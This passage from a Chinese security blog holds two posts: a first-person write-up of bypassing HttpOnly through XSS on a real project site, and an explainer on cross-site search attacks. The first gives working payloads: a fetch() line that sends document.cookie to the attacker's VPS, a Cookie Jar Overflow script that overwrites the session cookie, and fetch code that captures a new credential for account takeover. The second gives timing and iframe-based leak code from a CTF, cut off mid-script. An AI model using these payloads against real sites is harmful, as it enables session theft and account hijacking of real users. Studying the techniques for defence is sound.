    <url>/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<ul>
<li><a href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-httponly-%E7%9A%84-xss-%E6%94%BB%E5%87%BB">记一次绕过 HttpOnly 的 XSS 攻击</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E5%88%9D%E5%8F%91%E7%8E%B0">初发现</a></li>
<li><a href="#fetch-%E5%88%A9%E7%94%A8"><code>fetch()</code> 利用</a></li>
<li><a href="#cors-%E5%88%A9%E7%94%A8">CORS 利用</a></li>
<li><a href="#cookie-jar-overflow--fetch--%E7%BD%91%E7%AB%99%E7%89%B9%E6%AE%8A%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%9C%89%E6%95%88%E8%AE%A4%E8%AF%81">Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</a></li>
<li><a href="#%E5%90%8E%E8%AE%B0">后记</a></li>
</ul>
</li>
</ul>
<h1 id="记一次绕过-HttpOnly-的-XSS-攻击"><a href="#记一次绕过-HttpOnly-的-XSS-攻击" class="headerlink" title="记一次绕过 HttpOnly 的 XSS 攻击"></a>记一次绕过 HttpOnly 的 XSS 攻击</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目中一个网站，发现该网站存在 XSS 攻击点，有基本的安全防御。本来只想弹个框就收档，无奈 <code>alert()</code> 被 WAF，然后莫名奇妙折腾下去，遂有本文。</p>
<h2 id="初发现"><a href="#初发现" class="headerlink" title="初发现"></a>初发现</h2><p>站点网页 <a href="http://example.com/xxx/getCheckHouseList?estateNum=1111">http://example.com/xxx/getCheckHouseList?estateNum=1111</a> ，访问后，<code>estateNum=1111</code> 将会反映在 JavaScript 标签中。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png"></p>
<p>经过手工测试后，发现 <code>estateNum=1111</code> 存在 XSS 利用点，  尝试 <code>?estateNum=1111&#39;;alert()</code> ,发现服务器对请求不做应答。确认存在防御措施。</p>
<h2 id="fetch-利用"><a href="#fetch-利用" class="headerlink" title="fetch() 利用"></a><code>fetch()</code> 利用</h2><p>插入 <code>fetch()</code> 函数测试，发现居然通过了安全检测。修改插入的 JavaScript 代码，尝试向 VPS 发送 <code>Cookie</code>  。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?estateNum=1111&#x27;;fetch(&#x27;http://vpsip/&#x27;+document.cookie,&#123;method: &#x27;GET&#x27;&#125;);//</span><br></pre></td></tr></table></figure>

<p>查看网络发现，发送的 Cookie 字段不完整，真正有用的 JSESSIONID 缺失了。原来 JSESSIONID 设置了 HttpOnly 属性。喵喵喵？？？？</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png"><br><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png"></p>
<h2 id="CORS-利用"><a href="#CORS-利用" class="headerlink" title="CORS 利用"></a>CORS 利用</h2><p>既然无法直接发送Cookie，那就换个方式吧。修改 JavaScript 代码，通过 fetch() 进行携带 Cookie 的跨域访问以获取 Cookie。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://vpsip/&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>理所当然，失败了。原因是误解了关于 <code>credentials: &#39;include&#39;</code> 的描述，<code>credentials: &#39;include&#39;</code> 指示浏览器只能将本域 cookie 发送到本域以及子域，但无论如何本域 Cookie 均不能发送到他域。以下是查找资源及测试后关于 <code>credentials: &#39;include&#39;</code> 的理解。</p>
<p><strong>域与子域之间：</strong></p>
<p><strong>在域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
</ul>
<p><strong>在子域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
</ul>
<p><strong>在域的响应头中设置<code>credentials: same-origin</code></strong></p>
<ul>
<li>到域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到域服务器</li>
<li>到子域服务器：没有 cookie 发送到服务器</li>
</ul>
<p><strong>在子域的响应头中设置<code>credentials: same-origin</code></strong></p>
<ul>
<li>到子域服务器：<code>SameSite</code> 属性为 <code>strict</code> 和 <code>lax</code> 的 cookie 会被发送到子域服务器</li>
<li>到域服务器：没有cookies被发送到服务器</li>
</ul>
<p><strong>域与域之间（注意：<code>SameSite：none</code> 需要 https，否则设置无效）：</strong></p>
<p><strong>在 A 域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
<li>到 B 域服务器: <code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 B 域服务器，即由 B 域设置 Cookie 会被发送，A 域 Cookie 不会被发送。</li>
</ul>
<p><strong>在 B 域的响应头中设置 <code>credentials: include</code></strong></p>
<ul>
<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>none</code> 的外部 cookie 会被发送到 A 服务器，即由 A 域设置 Cookie 会被发送域，B 域 Cookie 不会被发送。</li>
</ul>
<p><strong>在 A 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
<ul>
<li>到 A 域服务器：<code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 A 域服务器</li>
<li>到 B 域服务器: 没有 cookie 发送到服务器</li>
</ul>
<p><strong>在 B 域的响应头中设置 <code>credentials: same-origin</code></strong></p>
<ul>
<li>到 B 域服务器： <code>SameSite</code> 属性为 <code>strict</code> 、 <code>lax</code> 和 <code>none</code> 的 cookie 会被发送到 B 域服务器</li>
<li>到 A 域服务器：没有 cookie 发送到服务器</li>
</ul>
<blockquote>
<p>参考：<a href="https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/">https://zellwk.com/blog/handling-cookies-with-fetchs-credentials/</a></p>
</blockquote>
<h2 id="Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。"><a href="#Cookie-Jar-Overflow-fetch-网站特殊认证方式获取有效认证。" class="headerlink" title="Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。"></a>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</h2><p>目标网站关于认证的信息：</p>
<ol>
<li>第一次访问 A 站点，服务器会进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=AAAAAA; HttpOnly</code>。</li>
<li>A 站点携带 <code>Cookie: JSESSIONID=AAAAAA</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点的地址以及 base64 加密后 <code>AAAAAA</code>。</li>
<li>打开统一认证地址完成认证之后，认证服务器将返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
<li>至此，<code>AAAAAA</code> 将变成有效凭证。</li>
</ol>
<p>对于重新认证的方式却有点不同：</p>
<ol>
<li>认证后，修改 A 站点 Cookie 为 <code>JSESSIONID=BBBBBB</code> 。</li>
<li>A 站点携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时， 由于未进行统一认证，服务器返回 302 响应包，且进行 <code>Set-Cookie</code> 操作：<code>Set-Cookie: JSESSIONID=CCCCCC; HttpOnly</code>。浏览器被重定向到统一认证地址，其中重定向地址的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
<li>浏览器重定向到统一认证地址，由于之前已经完成认证，在有效时间内统一认证地址的 Cookie 将一直可用。所以，本次无需重新手动认证，统一认证站点将会直接返回 302 响应包，重定向地址正是 <code>步骤 2</code> 中 <code>redirect_uri</code> 参数的值</li>
<li>至此，<code>CCCCC</code> 将变成有效凭证。</li>
</ol>
<p>对于重新认证，又有一个特别情况：</p>
<ol>
<li>将 A 站点 Cookie 修改为 <code>JSESSIONID=BBBBBB</code>后，在携带 <code>Cookie: JSESSIONID=BBBBBB</code> 访问要求凭证的接口时，在请求包添加请求头 <code>X-Requested-With: XMLHttpRequest</code>，服务器会返回 200 响应码，包含 <code>Set-Cookie: JSESSIONID=CCCCCC</code> 以及响应主体 json 数据，该 json 数据包含统一认证地址，地址中的 <code>redirect_uri</code> 参数包含 A 站点地址以及 base64 加密后 <code>CCCCCC</code>。</li>
<li>再次访问要求凭证的接口，A 站点将返回与 <code>步骤 1 </code> 所提及的，一模一样的统一认证地址。</li>
<li>统一认证地址返回 302 ，再次进行重定向。</li>
<li>至此，<code>CCCCC</code> 将变成有效凭证</li>
</ol>
<p>基于上面的情况，构建如下攻击方式：</p>
<ol>
<li><p>通过 Cookie Jar Overflow 攻击覆盖原来有效的 Cookie，即 <code>Cookie: JSESSIONID=AAAAAA</code> 覆盖为 <code>Cookie: JSESSIONID=BBBBBB</code>。</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Cookie Jar Overflow</span></span><br><span class="line"><span class="comment">//生成多个 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除所有 cookie</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">700</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`cookie<span class="subst">$&#123;i&#125;</span>=<span class="subst">$&#123;i&#125;</span>;expires=Thu, 01 Jan 1970 00:00:01 GMT`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//覆盖 HttpOnly cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;JSESSIONID=BBBBBB;path=/&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 fetch() 访问要求访问凭证接口，需添加 <code>X-Requested-With: XMLHttpRequest</code> 请求头。正如 <em><strong>对于重新认证，又有一个特别情况</strong></em> 所提及，服务器返回 json 数据，fetch 也提供了读取 json 数据的处理函数，所以我们可以将 json 数据读取出来，并将关键部分发送到 vps ，且 vps 返回重定向响应要求受害者浏览器访问 A 站点要求凭证的接口。<em><strong>重新认证</strong></em> 流程走一遍之后，发送到 vps 的凭证将变得可用。</p>
</li>
</ol>
<blockquote>
<p>为什么要添加 <code>X-Requested-With: XMLHttpRequest</code>，而不直接访问？因为到现在为止还未发现 fetch() 中读取 302 响应包的请求头方式。  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://target.com/requiredAuthenticationAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span> <span class="comment">//针对此应用程序，不添加该请求头服务器无法返回包含新可用 cookie 的 json 数据。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    response.<span class="title function_">json</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">        location = <span class="string">&#x27;http://127.0.0.1/location.html?x=&#x27;</span> + data.<span class="property">data</span>; <span class="comment">//</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">&#125;); <span class="comment">//</span></span><br></pre></td></tr></table></figure>
<ul>
<li>location.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://target.com/requiredAuthenticationAPI&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>成功获取有效凭证并控制账号。</li>
</ol>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>关于 “<em><strong>Cookie Jar Overflow + fetch + 网站特殊认证方式获取有效认证。</strong></em>“ 的利用，后面发现了一些情况。  JavaScript 代码执行到 fetch() 代码处，浏览器将根据代码生成请求包，但请求不立刻发送。待后续 JavaScript 代码执行完后，再进行发送。</p>
]]></content>
      <categories>
        <category>web 安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>HttpOnly</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站搜索攻击</title>
    <url>/2022/05/04/%E8%B7%A8%E7%AB%99%E6%90%9C%E7%B4%A2%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="跨站搜索攻击"><a href="#跨站搜索攻击" class="headerlink" title="跨站搜索攻击"></a>跨站搜索攻击</h1><p>跨站搜索攻击。基于目标站点 <strong>“根据内容搜索文件”</strong> 功能存在 CSRF 的前提下，攻击者在自己控制服务器上部署的 web 页面并设置搜索指定文件的 JavaScript 代码 ，诱导受害者访问该 web 页面。受害者访问后，通过一些技术，攻击者可得知受害者的文件库中是否存在指定文件，或猜测指定内容。</p>
<h2 id="基于时间的跨站搜索攻击"><a href="#基于时间的跨站搜索攻击" class="headerlink" title="基于时间的跨站搜索攻击"></a>基于时间的跨站搜索攻击</h2><p>基于时间的跨站搜索攻击。攻击者利用 <strong>CSRF 漏洞</strong> 强制受害者访问一些资源，这些资源只能是该受害者可以访问。然后，通过分析响应请求所需的时间，判断内容是否被正确访问。</p>
<p>攻击场景：某个 web 页面，各用户在该网页中只能访问属于自己的文件，admin 用户能访问所有文件。如果想知道以 <em><strong>flag</strong></em> 开头的文件，该如何做？</p>
<p>基于目标站点 <strong>“根据内容搜索文件”</strong> 功能存在 <strong>CSRF</strong> 漏洞，诱导 <strong>admin</strong> 访问由攻击者控制的 Web 页面，利用 CSRF 强制受害者循环执行搜索请求，以强制搜索所有以 “_<em>flag开头的文件</em><em>”可能性。然后，如果某个搜索请求比其他搜索请求的响应时间更久，你可以<strong>假设</strong>当前搜索请求获得了<strong>正确</strong>的响应（即服务器返回了 “</em><em>flag开头的文件</em>_” 内容），你可以用 “_flag{X_” 开始一个<strong>新循环</strong>直到拿到flag为止。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 代码展示上述过程</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;abcdefghijklmn....&quot;</span> </span><br><span class="line"><span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> strings:</span><br><span class="line">    url = <span class="string">&quot;http://target.com/search.php?filename=flag&#123;X&quot;</span>+ <span class="built_in">str</span></span><br><span class="line">    response = request.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(o゜▽゜)o☆[BINGO!]&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>有关更多信息，您可以阅读：</p>
<ul>
<li><a href="https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549">https:&#x2F;&#x2F;medium.com&#x2F;@luanherrera&#x2F;xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549</a></li>
<li><a href="https://www.researchgate.net/publication/280738245_Cross-Site_Search_Attacks">https://www.researchgate.net/publication/280738245_Cross-Site_Search_Attacks</a></li>
</ul>
<h2 id="基于-Iframe-的跨站搜索攻击"><a href="#基于-Iframe-的跨站搜索攻击" class="headerlink" title="基于 Iframe 的跨站搜索攻击"></a>基于 Iframe 的跨站搜索攻击</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在 Iframe 中，存在onload事件的情况下，onload 事件<strong>至少执行一次</strong>。如果一个 url 第一次能被正常加载，更改 window.hash 内容后，onload 事件将不会再次触发。如果 url 加载时出现某种错误（包括但不限于以下事件：请求超时、 域名不存在、 被 chrome XSS 过滤器的 block 模式屏蔽），那么更改 window.hash 内容后， <strong>onload</strong> 事件将被再次触发。</p>
<p>例如:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 Chrome Console 进行测试</span></span><br><span class="line"><span class="title class_">Console</span></span><br><span class="line">&gt; iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>); <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">&gt; iframe.<span class="property">onload</span>=<span class="function">()=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onload 事件已触发&quot;</span>);&#125;</span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://www.baidu.com/#try1&quot;</span>  <span class="comment">// window.hash： try1，目标站点存在 X-Frame-Options ，加载被 block。报错信息如下：</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">2 [Report Only] Refused to frame &#x27;https://www.baidu.com/&#x27; because it violates the following Content Security Policy directive: &quot;frame-src &#x27;self&#x27; https://g.alicdn.com&quot;.</span></span><br><span class="line"><span class="comment">Refused to display &#x27;https://www.baidu.com/#try1&#x27; in a frame because it set &#x27;X-Frame-Options&#x27; to &#x27;sameorigin&#x27;. 6698:1 </span></span><br><span class="line"><span class="comment">onload 事件已触发 VM5536:1 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://www.baidu.com/#try2&quot;</span> <span class="comment">//window.hash： try1 -》 try2，再次触发onload事件</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://sing3r.top/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/#try1&quot;</span> <span class="comment">// window.hash： try1，正常加载，触发 onload 事件</span></span><br><span class="line">&gt; iframe.<span class="property">src</span> = <span class="string">&quot;https://sing3r.top/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/#try2&quot;</span> <span class="comment">// window.hash： try1 -》 try2，正常加载，不触发 onload 事件</span></span><br></pre></td></tr></table></figure>

<p>根据上述知识，我们可以轻松区分一个页面是否加载正常。<br>同时也可以在访问正确的内容时，强制页面出现加载错误（如欺骗 Chrome XSS auditor，详见下面），并在访问非正确内容时使其正常加载，那么就可以创建循环请求，提取所有信息而无需通过分析响应时间。</p>
<h3 id="基于-Iframe-的跨站搜索攻击之-Chrome-XSS-Auditor-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效"><a href="#基于-Iframe-的跨站搜索攻击之-Chrome-XSS-Auditor-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效" class="headerlink" title="基于 Iframe 的跨站搜索攻击之 Chrome XSS Auditor (PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效)"></a>基于 Iframe 的跨站搜索攻击之 Chrome XSS Auditor (<em><strong>PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效</strong></em>)</h3><h4 id="Chrome-XSS-auditor-判断逻辑"><a href="#Chrome-XSS-auditor-判断逻辑" class="headerlink" title="Chrome XSS auditor 判断逻辑"></a>Chrome XSS auditor 判断逻辑</h4><p>chrome 的 XSS auditor 逻辑比较简单, 判断有没有输入敏感payload, 判断页面中有没有和自己长的一样的, 如果有敏感的payload, 同时页面中也有和自己长得一样的内容就会屏蔽。</p>
<h4 id="欺骗-Chrome-XSS-Auditor-进行-xs-seacrh"><a href="#欺骗-Chrome-XSS-Auditor-进行-xs-seacrh" class="headerlink" title="欺骗 Chrome XSS Auditor 进行 xs-seacrh"></a>欺骗 Chrome XSS Auditor 进行 xs-seacrh</h4><p>假如受害者使用 Chrome 浏览器，同时目标站点搜索功能在检索到有效内容时，response 中会包含特定的 JavaScript 代码，如：<code>&lt;script&gt;console.log(&#39;you found someting&#39;);&lt;/script&gt;</code>。检索不到有效内容时则不返回这个JavaScript代码。</p>
<p>基于上述场景，我们可使用 Iframe 让受害者循环搜索包含 <em><strong>flagX</strong></em> 的文件，同时在搜索请求的 url 中添加一个 fake 参数，参数值为 <code>&lt;script&gt;console.log(&#39;you found someting&#39;);&lt;/script&gt;</code>。这样就可以欺骗 Chrome XSS auditor，触发浏览器 XXS 拦截功能，从而导致加载失败。通过判断 Iframe 加载 url 是否失败，判断 flagX 中的 X 值是否正确。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 初始循环</span><br><span class="line">1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flagA&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flagB&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">N. ..........</span><br><span class="line">N+1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 有检索结果，response中包含 “&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;/script&gt;” ，触发 Chrome XSS auditor，Iframe 加载失败，内容 &quot;flag&#123;&quot; 正确--&gt;</span></span><br><span class="line"></span><br><span class="line"># 再次循环</span><br><span class="line">1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;A&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;B&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 无检索结果 --&gt;</span></span><br><span class="line">N. ..........</span><br><span class="line">N+1. <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.attacker.om/xssearch/?filename=flag&#123;f&amp;fake=&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;\/script&gt;&quot;</span>&gt;</span> <span class="comment">&lt;!-- 有检索结果，response 存在“&lt;script&gt;console.log(&#x27;you found someting&#x27;);&lt;/script&gt;” ，触发 Chrome XSS auditor内容，&quot;flag&#123;f&quot; 正确 --&gt;</span></span><br><span class="line"></span><br><span class="line"># 继续循环</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>For more information: <a href="https://www.youtube.com/watch?v=HcrQy0C-hEA">https://www.youtube.com/watch?v=HcrQy0C-hEA</a></p>
<h3 id="欺骗-Chrome-XSS-Auditor-进行窃取令牌-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效"><a href="#欺骗-Chrome-XSS-Auditor-进行窃取令牌-PS：19年7月，Chrome-XSS-auditor已被移除，X-XSS-OPTIONS-头已不再有效" class="headerlink" title="欺骗 Chrome XSS Auditor 进行窃取令牌(PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效)"></a>欺骗 Chrome XSS Auditor 进行窃取令牌(<em><strong>PS：19年7月，Chrome XSS auditor已被移除，X-XSS-OPTIONS 头已不再有效</strong></em>)</h3><p>使用上述提及技巧， 欺骗 Chrome XSS Auditor，您可以<strong>窃取返回给用户的代码块</strong>（例如token）。更多信息：<a href="https://portswigger.net/blog/abusing-chromes-xss-auditor-to-steal-tokens">https://portswigger.net/blog/abusing-chromes-xss-auditor-to-steal-tokens</a></p>
<p>请注意，您将窃取返回给用户的信息，而不是来自网络服务器的任何代码。</p>
<h3 id="基于-Iframe-的跨站搜索攻击之-iframe-contentWindow"><a href="#基于-Iframe-的跨站搜索攻击之-iframe-contentWindow" class="headerlink" title="基于 Iframe 的跨站搜索攻击之 iframe.contentWindow"></a>基于 Iframe 的跨站搜索攻击之 iframe.contentWindow</h3><p>这个的背景是一道CTF题目(fbctf2019), 在搜索笔记时, 所有被搜索到的笔记都会单独作为一个iframe列出, 而管理员拥有的一个私有的笔记, 这个笔记的内容中放置了flag, 题目没有限制外域打开(即没有设置 <code>X-Frame-Options</code> ), 可以通过 <code>Window.frames</code> 接口通过 <code>frames.length</code> 判断搜索的结果个数从而盲注得到flag。<br>具体来讲就是:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123; =&gt; frames.length = 1</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;a =&gt; frames.length = 0</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;b =&gt; frames.length = 0</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;c =&gt; frames.length =1</span><br><span class="line">http://challenges.fbctf.com:8082/search?query=fb&#123;ca =&gt; frames.length = 0</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>直到发现 <code>&#125;</code> 为止。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>fbctf secret note keeper<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~ &#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> charLen = chars.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> <span class="variable constant_">ENDPOINT</span> = <span 